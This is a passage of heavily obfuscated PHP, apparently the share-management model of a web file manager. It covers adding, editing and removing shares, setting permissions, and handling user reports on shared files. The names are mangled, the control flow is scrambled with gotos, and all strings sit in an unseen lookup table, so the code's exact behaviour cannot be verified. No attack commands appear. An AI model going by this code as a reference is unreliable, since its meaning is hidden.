f¿ºóî¹‚ö; f²¯…ÇŠØ: if (!$Aùí¸•†È®) { return $aÏ°ø»²øä; } $EŞ„Œ½ÏÒõ = $aáİã«µ†‹[1798]; $BÖë¥¬±ƒİ = array($aáİã«µ†‹[457] => array($aáİã«µ†‹[402], array_keys($Aùí¸•†È®))); goto f šÎí¸; f¿ºóî¹‚ö: $aáİã«µ†‹ =& $_SERVER[òÀöí]; $a¸ĞàÏ™ = Model($aáİã«µ†‹[1797])->userGroupParents(USER_ID); $BÖë¥¬±ƒİ = array($aáİã«µ†‹[538] => SourceModel::TYPE_USER, $aáİã«µ†‹[474] => USER_ID); goto C¿§ß×õÛ½; C¿§ß×õÛ½: if ($a¸ĞàÏ™) { $BÖë¥¬±ƒİ = array(array($aáİã«µ†‹[538] => SourceModel::TYPE_USER, $aáİã«µ†‹[474] => USER_ID), array($aáİã«µ†‹[538] => SourceModel::TYPE_GROUP, $aáİã«µ†‹[474] => array($aáİã«µ†‹[7], $a¸ĞàÏ™)), $aáİã«µ†‹[1795] => $aáİã«µ†‹[1752]); } $aÏ°ø»²øä = Model($aáİã«µ†‹[553])->where($BÖë¥¬±ƒİ)->selectPage($Eê¿Ì¹’±Š); $Aùí¸•†È® = array_to_keyvalue_group($aÏ°ø»²øä[$aáİã«µ†‹[363]], $aáİã«µ†‹[457]); goto f²¯…ÇŠØ; D÷¶”êÌ®á: $e­Æõæ‡Ó¾ = array($aáİã«µ†‹[1799] => $b°èå°æª’, $aáİã«µ†‹[1800] => $aÏ°ø»²øä[$aáİã«µ†‹[360]]); return $e­Æõæ‡Ó¾; goto eÛ´Íºƒœ; f šÎí¸: $b°èå°æª’ = $this->field($EŞ„Œ½ÏÒõ)->where($BÖë¥¬±ƒİ)->select(); foreach ($b°èå°æª’ as $FŒò•…í‚Ò => &$eÆù•ê¾İß) { $eÆù•ê¾İß[$aáİã«µ†‹[1794]] = $Aùí¸•†È®[$eÆù•ê¾İß[$aáİã«µ†‹[457]]]; } unset($eÆù•ê¾İß); goto D÷¶”êÌ®á; eÛ´Íºƒœ: } protected function shareAdd($cæÖ‡õ÷èó, $b‹àİ·’) { $FğÓãÎŒ¾º =& $_SERVER[òÀöí]; $Aˆ„ñÍ•Èš = $this->_addShareData($cæÖ‡õ÷èó, $b‹àİ·’); if (!empty($b‹àİ·’[$FğÓãÎŒ¾º[1801]])) { $this->_shareAuthSet($Aˆ„ñÍ•Èš, $b‹àİ·’[$FğÓãÎŒ¾º[1801]]); } $this->shareEventAdd($cæÖ‡õ÷èó, $b‹àİ·’, $FğÓãÎŒ¾º[1037]); return $Aˆ„ñÍ•Èš; } private function shareEventAdd($D…ì“†î±À, $dÈ¶ÒƒÜÁ¾, $dëˆâô—Äß = "\x61\144\x64") { goto EĞÀ½×ˆ‘Ù; EĞÀ½×ˆ‘Ù: $EÅñèô©êš =& $_SERVER[òÀöí]; if ($dëˆâô—Äß == $EÅñèô©êš[1037]) { if ($dÈ¶ÒƒÜÁ¾[$EÅñèô©êš[462]] == $EÅñèô©êš[86]) { Model($EÅñèô©êš[522])->eventShare($D…ì“†î±À, $EÅñèô©êš[1802]); } if ($dÈ¶ÒƒÜÁ¾[$EÅñèô©êš[464]] == $EÅñèô©êš[86]) { Model($EÅñèô©êš[522])->eventShare($D…ì“†î±À, $EÅñèô©êš[1803]); } return; } $C¡ìâ¬âÏ = $this->getInfoByPath($D…ì“†î±À); goto Aè—ˆóöğš; E¸«Â¬‚Û: return; goto EˆŒ‡¨¬Ñ; Aè—ˆóöğš: $b­…À†ªÈñ = $EÅñèô©êš[1804]; if ($C¡ìâ¬âÏ[$EÅñèô©êš[462]] == $EÅñèô©êš[486] && $dÈ¶ÒƒÜÁ¾[$EÅñèô©êš[462]] == $EÅñèô©êš[86]) { $b­…À†ªÈñ = $EÅñèô©êš[1802]; } if ($C¡ìâ¬âÏ[$EÅñèô©êš[462]] == $EÅñèô©êš[86] && $dÈ¶ÒƒÜÁ¾[$EÅñèô©êš[462]] == $EÅñèô©êš[486]) { $b­…À†ªÈñ = $EÅñèô©êš[1805]; } goto bÒİµĞÂ‰ì; bÒİµĞÂ‰ì: if ($C¡ìâ¬âÏ[$EÅñèô©êš[464]] == $EÅñèô©êš[486] && $dÈ¶ÒƒÜÁ¾[$EÅñèô©êš[464]] == $EÅñèô©êš[86]) { $b­…À†ªÈñ = $EÅñèô©êš[1803]; } if ($C¡ìâ¬âÏ[$EÅñèô©êš[464]] == $EÅñèô©êš[86] && $dÈ¶ÒƒÜÁ¾[$EÅñèô©êš[464]] == $EÅñèô©êš[486]) { $b­…À†ªÈñ = $EÅñèô©êš[1806]; } Model($EÅñèô©êš[522])->eventShare($D…ì“†î±À, $b­…À†ªÈñ); goto E¸«Â¬‚Û; EˆŒ‡¨¬Ñ: } private function _addShareData($cÁ¹¹­Ø®Á, $cêÙ¿õÍÙ = array()) { goto e÷³éÉŸÎÍ; e•—¼–†¶: $cÎÏŠ ‘º„ = array($CÕŞ›©–Ï™[1496] => USER_ID, $CÕŞ›©–Ï™[401] => $cÁ¹¹­Ø®Á, $CÕŞ›©–Ï™[1409] => $CÕŞ›©–Ï™[33], $CÕŞ›©–Ï™[462] => 0, $CÕŞ›©–Ï™[464] => 0, $CÕŞ›©–Ï™[1049] => $CÕŞ›©–Ï™[33], $CÕŞ›©–Ï™[303] => $CÕŞ›©–Ï™[33], $CÕŞ›©–Ï™[828] => $CÕŞ›©–Ï™[33], $CÕŞ›©–Ï™[1808] => 0, $CÕŞ›©–Ï™[1809] => 0, $CÕŞ›©–Ï™[465] => 0, $CÕŞ›©–Ï™[466] => $CÕŞ›©–Ï™[33], $CÕŞ›©–Ï™[459] => $CÕŞ›©–Ï™[33]); $F÷«õáÊÇ‰ = explode($CÕŞ›©–Ï™[47], $CÕŞ›©–Ï™[1810]); foreach ($F÷«õáÊÇ‰ as $E˜›¼é¡Õ÷) { if (!isset($cêÙ¿õÍÙ[$E˜›¼é¡Õ÷])) { continue; } $cÎÏŠ ‘º„[$E˜›¼é¡Õ÷] = $cêÙ¿õÍÙ[$E˜›¼é¡Õ÷]; } goto aùÙÍ¦“›Õ; b¡£Ì„›Éö: if ($C×õ–ÕíÏõ = $this->where($fŠØŠ¶Êñ)->find()) { return $C×õ–ÕíÏõ[$CÕŞ›©–Ï™[457]]; } if ($cÁ¹¹­Ø®Á == 0) { $b÷ÅÔ÷ãœ– = array($CÕŞ›©–Ï™[28] => get_path_this($cêÙ¿õÍÙ[$CÕŞ›©–Ï™[75]])); } else { $b÷ÅÔ÷ãœ– = Model($CÕŞ›©–Ï™[778])->sourceInfo($cÁ¹¹­Ø®Á); if (!$b÷ÅÔ÷ãœ–) { return !1; } } if (!$cêÙ¿õÍÙ[$CÕŞ›©–Ï™[1409]]) { $cêÙ¿õÍÙ[$CÕŞ›©–Ï™[1409]] = $b÷ÅÔ÷ãœ–[$CÕŞ›©–Ï™[28]]; } goto e•—¼–†¶; d‰¿Ñˆó: return $Bõ¥¡Íö´Ø; goto AÍâÙóêŒ´; aùÙÍ¦“›Õ: $Bõ¥¡Íö´Ø = $this->add($cÎÏŠ ‘º„); $bÓŠµ‚öÁŠ = array($CÕŞ›©–Ï™[459] => short_id($Bõ¥¡Íö´Ø)); $this->where(array($CÕŞ›©–Ï™[456] => $Bõ¥¡Íö´Ø))->save($bÓŠµ‚öÁŠ); goto d‰¿Ñˆó; e÷³éÉŸÎÍ: $CÕŞ›©–Ï™ =& $_SERVER[òÀöí]; $fŠØŠ¶Êñ = array($CÕŞ›©–Ï™[401] => $cÁ¹¹­Ø®Á, $CÕŞ›©–Ï™[1496] => USER_ID); if ($cÁ¹¹­Ø®Á == 0) { $fŠØŠ¶Êñ = array($CÕŞ›©–Ï™[1807] => $cêÙ¿õÍÙ[$CÕŞ›©–Ï™[1049]], $CÕŞ›©–Ï™[1496] => USER_ID); } goto b¡£Ì„›Éö; AÍâÙóêŒ´: } private function _shareAuthSet($CƒËùµ¹”ƒ, $Dª‚á•õ‡) { goto B‡£‚˜Ç¥; B‡£‚˜Ç¥: $eİÑá„Ø³Ğ =& $_SERVER[òÀöí]; if (!is_array($Dª‚á•õ‡)) { return !1; } $dÊÂÉÉÂ‡Á = Model($eİÑá„Ø³Ğ[1811]); goto F‰åø¯Ôë»; F‰åø¯Ôë»: $dÊÂÉÉÂ‡Á->where(array($eİÑá„Ø³Ğ[457] => $CƒËùµ¹”ƒ))->delete(); $b›í¾¦É¾Ù = array(); foreach ($Dª‚á•õ‡ as $eØ•Ú•øƒ‘) { $b¾˜Ñ˜¾éÇ = SourceModel::TYPE_USER; if ($eØ•Ú•øƒ‘[$eİÑá„Ø³Ğ[389]] == SourceModel::TYPE_GROUP) { $b¾˜Ñ˜¾éÇ = SourceModel::TYPE_GROUP; } $B¡—ÂğŒßæ = array($eİÑá„Ø³Ğ[457] => $CƒËùµ¹”ƒ, $eİÑá„Ø³Ğ[389] => $b¾˜Ñ˜¾éÇ, $eİÑá„Ø³Ğ[474] => intval($eØ•Ú•øƒ‘[$eİÑá„Ø³Ğ[474]]), $eİÑá„Ø³Ğ[1812] => 0, $eİÑá„Ø³Ğ[1813] => -1); if ($eØ•Ú•øƒ‘[$eİÑá„Ø³Ğ[1812]]) { $B¡—ÂğŒßæ[$eİÑá„Ø³Ğ[1812]] = $eØ•Ú•øƒ‘[$eİÑá„Ø³Ğ[1812]]; } else { if ($eØ•Ú•øƒ‘[$eİÑá„Ø³Ğ[1813]]) { $B¡—ÂğŒßæ[$eİÑá„Ø³Ğ[1813]] = $eØ•Ú•øƒ‘[$eİÑá„Ø³Ğ[1813]]; } } $b›í¾¦É¾Ù[] = $B¡—ÂğŒßæ; } goto EèÇ³å® ’; EèÇ³å® ’: return $dÊÂÉÉÂ‡Á->addAll($b›í¾¦É¾Ù, array(), !0); goto fßÄîĞ‹’Ÿ; fßÄîĞ‹’Ÿ: } public function numViewAdd($D‰ÚÒ”·±) { $d†Š¶ª¯…• =& $_SERVER[òÀöí]; $B´“Ò¥£¸ó = array($d†Š¶ª¯…•[456] => $D‰ÚÒ”·±); $this->where($B´“Ò¥£¸ó)->setAdd($d†Š¶ª¯…•[1808]); } public function numDownloadAdd($fœƒ„å˜ğ½) { $e×ŒğÏåå§ =& $_SERVER[òÀöí]; $CÚ¬×Şº˜ = array($e×ŒğÏåå§[456] => $fœƒ„å˜ğ½); $this->where($CÚ¬×Şº˜)->setAdd($e×ŒğÏåå§[1809]); } protected function shareEdit($dó¬ìÓ¥Í¶, $a‘î®÷´äÃ) { goto Fì¶ÑÇ®‹§; BìËÁÃ›Â¾: if (isset($a‘î®÷´äÃ[$f‘‰ºõ„ˆ‰[1801]])) { $this->_shareAuthSet($dó¬ìÓ¥Í¶, $a‘î®÷´äÃ[$f‘‰ºõ„ˆ‰[1801]]); } return !0; goto eÔ‡èœ•æ; Fì¶ÑÇ®‹§: $f‘‰ºõ„ˆ‰ =& $_SERVER[òÀöí]; $d®’ğÖ´‘‰ = $this->getInfo($dó¬ìÓ¥Í¶); if (!$d®’ğÖ´‘‰) { return !1; } goto fÙÓÊò¦Äã; fÙÓÊò¦Äã: $this->_checkLinkShare($a‘î®÷´äÃ, $d®’ğÖ´‘‰); $e·ßİÑÊª = array(); $dæŒÉáƒÛÇ = explode($f‘‰ºõ„ˆ‰[47], $f‘‰ºõ„ˆ‰[1814]); goto d±±‘‘Ûõ’; d±±‘‘Ûõ’: foreach ($dæŒÉáƒÛÇ as $Aäæ¶¯Šùä) { if (!array_key_exists($Aäæ¶¯Šùä, $a‘î®÷´äÃ)) { continue; } $e·ßİÑÊª[$Aäæ¶¯Šùä] = $a‘î®÷´äÃ[$Aäæ¶¯Šùä]; } $this->shareEventAdd($d®’ğÖ´‘‰[$f‘‰ºõ„ˆ‰[387]], $a‘î®÷´äÃ, $f‘‰ºõ„ˆ‰[1630]); $this->where(array($f‘‰ºõ„ˆ‰[456] => $dó¬ìÓ¥Í¶))->save($e·ßİÑÊª); goto BìËÁÃ›Â¾; eÔ‡èœ•æ: } private function _checkLinkShare($dËçùÕººˆ, $dÖôÔÌğ) { goto fÊÁæÉ¡‡æ; D“‘ÀÄ¹¶‡: $f…Àº•Ôä = $this->shareFileMeta($Dõ‘“˜§ô‚[$EôÇÒ×‹ğÈ[436]]); if (isset($f…Àº•Ôä[$EôÇÒ×‹ğÈ[368]]) && $f…Àº•Ôä[$EôÇÒ×‹ğÈ[368]] == $EôÇÒ×‹ğÈ[86]) { show_json(LNG($EôÇÒ×‹ğÈ[1817]), !1); } goto C»§‡¨œ²; CÍ¾ÎßÑ¸: if ($dÖôÔÌğ[$EôÇÒ×‹ğÈ[84]][$EôÇÒ×‹ğÈ[29]] != $EôÇÒ×‹ğÈ[173]) { $d‹ ¶¹Ï = $this->_folderReport($eø¡ŞÇ±Š©); if (!$d‹ ¶¹Ï) { return; } show_json(LNG($EôÇÒ×‹ğÈ[1815]) . $EôÇÒ×‹ğÈ[1816] . $d‹ ¶¹Ï, !1); } $Dõ‘“˜§ô‚ = Model($EôÇÒ×‹ğÈ[778])->fileInfoGet($dÖôÔÌğ[$EôÇÒ×‹ğÈ[84]][$EôÇÒ×‹ğÈ[387]]); if (!$Dõ‘“˜§ô‚) { return; } goto D“‘ÀÄ¹¶‡; fÊÁæÉ¡‡æ: $EôÇÒ×‹ğÈ =& $_SERVER[òÀöí]; if ($dËçùÕººˆ[$EôÇÒ×‹ğÈ[462]] != $EôÇÒ×‹ğÈ[86]) { return; } $eø¡ŞÇ±Š© = $dÖôÔÌğ[$EôÇÒ×‹ğÈ[84]][$EôÇÒ×‹ğÈ[387]]; goto CÍ¾ÎßÑ¸; C»§‡¨œ²: } private function _folderReport($aº£Ü¬“—„) { goto eŒÄÌóË¨Ê; fğ«”æÒ©: if (!$eçÑ¨ÔÜ¨ä) { return !1; } $eçÑ¨ÔÜ¨ä = array_to_keyvalue($eçÑ¨ÔÜ¨ä, $c…ßâø³é[33], $c…ßâø³é[436]); $aØà“ùÖ™ = $c…ßâø³é[47] . $aº£Ü¬“—„ . $c…ßâø³é[47]; goto BÆÙïÏŸè; F¬­ÆŠ•ªğ: $e…ˆ”ÜŒÑ° = substr($d²Ô¥ŠÙÉˆ[$c…ßâø³é[477]], strpos($d²Ô¥ŠÙÉˆ[$c…ßâø³é[477]], $aØà“ùÖ™)); $Fîî´ó¿È = array($c…ßâø³é[387] => array($c…ßâø³é[7], trim($e…ˆ”ÜŒÑ°, $c…ßâø³é[47]))); $f‡Ç“ŸÓÎ© = Model($c…ßâø³é[778])->where($Fîî´ó¿È)->field($c…ßâø³é[28])->select(); goto B©•šº‰£è; B©•šº‰£è: $fíÁÀëí¨Ş = array_to_keyvalue($f‡Ç“ŸÓÎ©, $c…ßâø³é[33], $c…ßâø³é[28]); $fíÁÀëí¨Ş[] = $d²Ô¥ŠÙÉˆ[$c…ßâø³é[28]]; return implode($c…ßâø³é[8], $fíÁÀëí¨Ş); goto F®™‚©‹Ğ; BÆÙïÏŸè: $Fîî´ó¿È = array($c…ßâø³é[436] => array($c…ßâø³é[7], $eçÑ¨ÔÜ¨ä), $c…ßâø³é[477] => array($c…ßâø³é[375], "\x25{$aØà“ùÖ™}\x25"), $c…ßâø³é[414] => 0); $d²Ô¥ŠÙÉˆ = Model($c…ßâø³é[778])->where($Fîî´ó¿È)->field($c…ßâø³é[1819])->find(); if (!$d²Ô¥ŠÙÉˆ) { return !1; } goto F¬­ÆŠ•ªğ; eŒÄÌóË¨Ê: $c…ßâø³é =& $_SERVER[òÀöí]; $Fîî´ó¿È = array($c…ßâø³é[436] => array($c…ßâø³é[948], 0), $c…ßâø³é[708] => 3); $eçÑ¨ÔÜ¨ä = Model($c…ßâø³é[1818])->where($Fîî´ó¿È)->field($c…ßâø³é[436])->select(); goto fğ«”æÒ©; F®™‚©‹Ğ: } protected function remove($AÒ¥ïµÖˆß) { goto F±Œ¤ˆëÉ‘; F±Œ¤ˆëÉ‘: $D£­‹½¥ˆ  =& $_SERVER[òÀöí]; if (is_array($AÒ¥ïµÖˆß)) { $AÒ¥ïµÖˆß = array($D£­‹½¥ˆ [7], $AÒ¥ïµÖˆß); } $cÄÖ‡¸Éä = array($D£­‹½¥ˆ [457] => $AÒ¥ïµÖˆß); goto b¾Œ•Ï˜äô; b¾Œ•Ï˜äô: $f‹ÇñÈŸ = $this->where($cÄÖ‡¸Éä)->delete(); if ($f‹ÇñÈŸ) { Model($D£­‹½¥ˆ [553])->where(array($D£­‹½¥ˆ [457] => $AÒ¥ïµÖˆß))->delete(); } $A°Éğ¥‡—® = is_array($AÒ¥ïµÖˆß) ? $AÒ¥ïµÖˆß[1] : array($AÒ¥ïµÖˆß); goto F›äÓ«Ã’; F›äÓ«Ã’: for ($AÜù‡´äÈõ = 0; $AÜù‡´äÈõ < count($A°Éğ¥‡—®); $AÜù‡´äÈõ++) { $EÑ–«Ïî…Œ = $this->getInfo($A°Éğ¥‡—®[$AÜù‡´äÈõ]); if ($EÑ–«Ïî…Œ[$D£­‹½¥ˆ [464]] == $D£­‹½¥ˆ [86]) { Model($D£­‹½¥ˆ [522])->eventShare($EÑ–«Ïî…Œ[$D£­‹½¥ˆ [387]], $D£­‹½¥ˆ [1806]); } if ($EÑ–«Ïî…Œ[$D£­‹½¥ˆ [462]] == $D£­‹½¥ˆ [86]) { Model($D£­‹½¥ˆ [522])->eventShare($EÑ–«Ïî…Œ[$D£­‹½¥ˆ [387]], $D£­‹½¥ˆ [1805]); } } return $f‹ÇñÈŸ; goto B–±Ğ¢Îô; B–±Ğ¢Îô: } protected function removeBySource($aá«“¬ï¹) { goto FèòÚ‡áµŒ; b£»Şˆ†×š: $EèÛÊÑäÍÓ = array_to_keyvalue($EèÛÊÑäÍÓ, $A‡Áµ°îÛÁ[33], $A‡Áµ°îÛÁ[457]); if (!$EèÛÊÑäÍÓ) { return; } $D¨º˜áÒ¯Ù = array($A‡Áµ°îÛÁ[456] => array($A‡Áµ°îÛÁ[402], $EèÛÊÑäÍÓ)); goto DŒ¥ßÏÉŒ; DŒ¥ßÏÉŒ: $this->where($D¨º˜áÒ¯Ù)->delete(); Model($A‡Áµ°îÛÁ[553])->where($D¨º˜áÒ¯Ù)->delete(); goto D¹ÆìŒŠî; FèòÚ‡áµŒ: $A‡Áµ°îÛÁ =& $_SERVER[òÀöí]; $D¨º˜áÒ¯Ù = array($A‡Áµ°îÛÁ[401] => array($A‡Áµ°îÛÁ[402], $aá«“¬ï¹)); $EèÛÊÑäÍÓ = $this->field($A‡Áµ°îÛÁ[457])->where($D¨º˜áÒ¯Ù)->select(); goto b£»Şˆ†×š; D¹ÆìŒŠî: } public function listAll($Fæé§É©óó) { goto c´„êÊœä; BóôÛì½Ìà: if ($Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[721]]) { $fÁøÀ—Ï‹— = $Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[465]] ? $Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[465]] : strtotime(date($d•ƒ¡ŸÆ±Ê[1820])); $bï•„÷—[$d•ƒ¡ŸÆ±Ê[192]] = array($d•ƒ¡ŸÆ±Ê[329], array($Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[721]], $fÁøÀ—Ï‹—)); } if ($Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[29]]) { $bï•„÷—[$Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[29]]] = 1; } else { $bï•„÷—[] = array($d•ƒ¡ŸÆ±Ê[462] => array($d•ƒ¡ŸÆ±Ê[948], 0), $d•ƒ¡ŸÆ±Ê[464] => array($d•ƒ¡ŸÆ±Ê[948], 0), $d•ƒ¡ŸÆ±Ê[1795] => $d•ƒ¡ŸÆ±Ê[1752]); } if ($Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[1748]]) { $bï•„÷—[] = array($d•ƒ¡ŸÆ±Ê[459] => $Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[1748]], $d•ƒ¡ŸÆ±Ê[1409] => array($d•ƒ¡ŸÆ±Ê[375], "\45{$Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[1748]]}\x25"), $d•ƒ¡ŸÆ±Ê[1795] => $d•ƒ¡ŸÆ±Ê[1752]); } goto EŸµ¿áœÒ; EŸµ¿áœÒ: $c‹œÀ £…ä = $this->_makeOrder()->where($bï•„÷—)->selectPage(20); if (empty($c‹œÀ £…ä[$d•ƒ¡ŸÆ±Ê[363]])) { return array(); } $this->_listDataApply($c‹œÀ £…ä[$d•ƒ¡ŸÆ±Ê[363]]); goto A¸µÀÉƒÀ; c´„êÊœä: $d•ƒ¡ŸÆ±Ê =& $_SERVER[òÀöí]; $bï•„÷— = array(); if ($Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[1504]]) { $bï•„÷—[$d•ƒ¡ŸÆ±Ê[1504]] = $Fæé§É©óó[$d•ƒ¡ŸÆ±Ê[1504]]; } goto BóôÛì½Ìà; A¸µÀÉƒÀ: return $c‹œÀ £…ä; goto CÛ´‰èÀÔ÷; CÛ´‰èÀÔ÷: } public function listDataApply($AÅÂ“Î‘ê) { $this->_listDataApply($AÅÂ“Î‘ê); return $AÅÂ“Î‘ê; } private function _listDataApply(&$cÚ¬‘ÑàË•) { goto F¦ÁôÎ÷; B£çº©êØ”: unset($F…×”ïæùÛ); goto C¼•‚ƒ¶¸; EîºÃóÇÃğ: $F®š¯î•ÔÎ = array_to_keyvalue($cÚ¬‘ÑàË•, $dåè“›ª–ñ[33], $dåè“›ª–ñ[387]); $aÀÒğø´› = Model($dåè“›ª–ñ[778])->sourceListInfo($F®š¯î•ÔÎ, !0); foreach ($cÚ¬‘ÑàË• as &$F…×”ïæùÛ) { $eØ¸‚ƒÒì = $F…×”ïæùÛ[$dåè“›ª–ñ[1504]]; $F…×”ïæùÛ[$dåè“›ª–ñ[1821]] = $Cïœ”çñõ“[$eØ¸‚ƒÒì] ? $Cïœ”çñõ“[$eØ¸‚ƒÒì] : !1; $aªÎ¹Ã†‘‚ = $F…×”ïæùÛ[$dåè“›ª–ñ[387]]; $F…×”ïæùÛ[$dåè“›ª–ñ[84]] = $aÀÒğø´›[$aªÎ¹Ã†‘‚] ? $aÀÒğø´›[$aªÎ¹Ã†‘‚] : !1; } goto B£çº©êØ”; F¦ÁôÎ÷: $dåè“›ª–ñ =& $_SERVER[òÀöí]; $EğÅéÑîš = array_to_keyvalue($cÚ¬‘ÑàË•, $dåè“›ª–ñ[33], $dåè“›ª–ñ[1504]); $Cïœ”çñõ“ = Model($dåè“›ª–ñ[495])->userListInfo(array_unique($EğÅéÑîš)); goto EîºÃóÇÃğ; C¼•‚ƒ¶¸: } private function _makeOrder($e¾ª­ç¸İ¡ = '') { goto cš™Ñ‰¬â; EŞ‚ç¹õ·ô: $e¾ª­ç¸İ¡ = $e¾ª­ç¸İ¡ . "{$e‰Ë„»ºò}\x20{$F†Ÿêø„}"; return $this->order($e¾ª­ç¸İ¡); goto D÷ÂÈ»Æ¶é; cš™Ñ‰¬â: $E¤ç±Âåá· =& $_SERVER[òÀöí]; $B³ÙÉ™Í¯ = array($E¤ç±Âåá·[192], $E¤ç±Âåá·[465], $E¤ç±Âåá·[1808], $E¤ç±Âåá·[1809]); $fØš¾ª·¬É = array($E¤ç±Âåá·[419] => $E¤ç±Âåá·[420], $E¤ç±Âåá·[421] => $E¤ç±Âåá·[422]); goto F”½Õº÷Ôë; F”½Õº÷Ôë: $e‰Ë„»ºò = Input::get($E¤ç±Âåá·[424], $E¤ç±Âåá·[7], $E¤ç±Âåá·[407], $B³ÙÉ™Í¯); $F†Ÿêø„ = Input::get($E¤ç±Âåá·[425], $E¤ç±Âåá·[7], $E¤ç±Âåá·[1822], array($E¤ç±Âåá·[1747], $E¤ç±Âåá·[421])); $F†Ÿêø„ = $fØš¾ª·¬É[$F†Ÿêø„]; goto EŞ‚ç¹õ·ô; D÷ÂÈ»Æ¶é: } public function reportAdd($aÆ²ƒÉà±ì) { $fÈ’ëèã¯‹ =& $_SERVER[òÀöí]; $cÀ‰¤š‰ Õ = array($fÈ’ëèã¯‹[457] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[457]], $fÈ’ëèã¯‹[1504] => USER_ID); if (Model($fÈ’ëèã¯‹[1818])->where($cÀ‰¤š‰ Õ)->find()) { return !1; } $d»îô…›Û´ = array($fÈ’ëèã¯‹[457] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[457]], $fÈ’ëèã¯‹[1409] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[1409]], $fÈ’ëèã¯‹[387] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[387]], $fÈ’ëèã¯‹[436] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[436]], $fÈ’ëèã¯‹[1504] => USER_ID, $fÈ’ëèã¯‹[29] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[29]], $fÈ’ëèã¯‹[422] => $aÆ²ƒÉà±ì[$fÈ’ëèã¯‹[422]]); return Model($fÈ’ëèã¯‹[1818])->add($d»îô…›Û´); } public function reportList($C¨È°ˆõÆù) { goto Aç–Å·÷Š; aÙ°†‰ä²ò: if (empty($E©ä¸Ö[$CÖ“Ã¦[363]])) { return array(); } $this->_listDataApply($E©ä¸Ö[$CÖ“Ã¦[363]]); return $E©ä¸Ö; goto Câæø›ğÄË; f†É¥‘µÆ: $Fš½¦¹Ú›º = array($CÖ“Ã¦[419] => $CÖ“Ã¦[420], $CÖ“Ã¦[421] => $CÖ“Ã¦[422]); $e¥—Î§šà = $CÖ“Ã¦[1827] . $Fš½¦¹Ú›º[$A¹Ğ˜ñÉÒ–]; $E©ä¸Ö = Model($CÖ“Ã¦[1818])->where($dŒÓíĞÂŒ)->order($e¥—Î§šà)->selectPage(20); goto aÙ°†‰ä²ò; Aç–Å·÷Š: $CÖ“Ã¦ =& $_SERVER[òÀöí]; $dŒÓíĞÂŒ = array(); if ($C¨È°ˆõÆù[$CÖ“Ã¦[721]]) { $d˜Å´×ñáğ = $C¨È°ˆõÆù[$CÖ“Ã¦[465]] ? $C¨È°ˆõÆù[$CÖ“Ã¦[465]] : strtotime(date($CÖ“Ã¦[1820])); $dŒÓíĞÂŒ[$CÖ“Ã¦[192]] = array($CÖ“Ã¦[329], array($C¨È°ˆõÆù[$CÖ“Ã¦[721]], $d˜Å´×ñáğ)); } goto b¼Ï¸Ÿ¶•; b¼Ï¸Ÿ¶•: if (isset($C¨È°ˆõÆù[$CÖ“Ã¦[29]]) && in_array($C¨È°ˆõÆù[$CÖ“Ã¦[29]], array($CÖ“Ã¦[86], $CÖ“Ã¦[1823], $CÖ“Ã¦[1824], $CÖ“Ã¦[1825], $CÖ“Ã¦[1826]))) { $dŒÓíĞÂŒ[$CÖ“Ã¦[29]] = $C¨È°ˆõÆù[$CÖ“Ã¦[29]]; } if (isset($C¨È°ˆõÆù[$CÖ“Ã¦[708]]) && in_array($C¨È°ˆõÆù[$CÖ“Ã¦[708]], array($CÖ“Ã¦[486], $CÖ“Ã¦[86], $CÖ“Ã¦[1823], $CÖ“Ã¦[1824]))) { $dŒÓíĞÂŒ[$CÖ“Ã¦[708]] = $C¨È°ˆõÆù[$CÖ“Ã¦[708]]; } $A¹Ğ˜ñÉÒ– = Input::get($CÖ“Ã¦[425], $CÖ“Ã¦[7], $CÖ“Ã¦[1822], array($CÖ“Ã¦[1747], $CÖ“Ã¦[421])); goto f†É¥‘µÆ; Câæø›ğÄË: } public function reportStatus($Bñ­´£öó) { goto Bßßğš¶Ñ ; CÁÃ×ğ»Ş«: return $FÎöÛÓÃ; goto EÅ°Š¡¡—Ÿ; Bßßğš¶Ñ : $C­¼¾™Šğö =& $_SERVER[òÀöí]; $DÎêÆÙ¿Ù = array($C­¼¾™Šğö[385] => $Bñ­´£öó[$C­¼¾™Šğö[385]]); $A«‚Ø¡™§ = Model($C­¼¾™Šğö[1818])->where($DÎêÆÙ¿Ù)->field($C­¼¾™Šğö[1828])->find(); goto c³ĞÕâ¯óî; c³ĞÕâ¯óî: if (!$A«‚Ø¡™§) { return !1; } $cùƒğ¬…øš = array($C­¼¾™Šğö[708] => $Bñ­´£öó[$C­¼¾™Šğö[708]]); if ($Bñ­´£öó[$C­¼¾™Šğö[708]] == $C­¼¾™Šğö[1824] && $A«‚Ø¡™§[$C­¼¾™Šğö[708]] == $C­¼¾™Šğö[1824]) { $cùƒğ¬…øš[$C­¼¾™Šğö[708]] = 0; } goto DÊ–±÷‘Œª; DÊ–±÷‘Œª: $FÎöÛÓÃ = Model($C­¼¾™Šğö[1818])->where($DÎêÆÙ¿Ù)->save($cùƒğ¬…øš); if ($Bñ­´£öó[$C­¼¾™Šğö[708]] == $C­¼¾™Šğö[1823]) { if ($A«‚Ø¡™§[$C­¼¾™Šğö[436]] != $C­¼¾™Šğö[486] && $this->shareFileMeta($A«‚Ø¡™§[$C­¼¾™Šğö[436]])) { $this->shareFileMeta($A«‚Ø¡™§[$C­¼¾™Šğö[436]], 0); } $this->remove($A«‚Ø¡™§[$C­¼¾™Šğö[457]]); return !0; } if ($FÎöÛÓÃ && $Bñ­´£öó[$C­¼¾™Šğö[708]] == $C­¼¾™Šğö[1824]) { $CÌò§¦æİ¡ = $cùƒğ¬…øš[$C­¼¾™Šğö[708]] == $C­¼¾™Šğö[1824] ? 1 : 0; $this->shareFileMeta($A«‚Ø¡™§[$C­¼¾™Šğö[436]], $CÌò§¦æİ¡); $this->removeByFile($A«‚Ø¡™§[$C­¼¾™Šğö[436]]); } goto CÁÃ×ğ»Ş«; EÅ°Š¡¡—Ÿ: } private function removeByFile($eÖ×Ö³ˆà) { goto E¨™Ší·; 